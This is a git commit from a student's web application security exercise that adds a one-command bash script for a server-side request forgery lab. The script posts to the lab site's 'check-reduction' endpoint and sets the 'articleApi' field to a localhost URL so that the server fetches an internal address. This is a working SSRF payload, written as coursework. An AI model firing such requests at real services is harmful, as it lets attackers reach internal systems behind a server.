14c79a031966fd5231879934b2a133936eb45168
omayma199 <5752@holbertonstudents.com>
2024-08-07 12:00:35 +0100

    test

---
+++ web_application_security/0x08_ssrf/bash.sh
@@ -0,0 +1,15 @@
+curl -v -X POST "http://web0x08.hbtn/check-reduction" \
+  -H "Host: web0x08.hbtn" \
+  -H "Content-Length: 70" \
+  -H "Cache-Control: max-age=0" \
+  -H "Accept-Language: fr-FR" \
+  -H "Upgrade-Insecure-Requests: 1" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36" \
+  -H "Origin: http://web0x08.hbtn" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
+  -H "Referer: http://web0x08.hbtn/product" \
+  -H "Accept-Encoding: gzip, deflate, br" \
+  -H "Connection: keep-alive" \
+  --data "articleApi=http://127.0.0.1:80/"
+
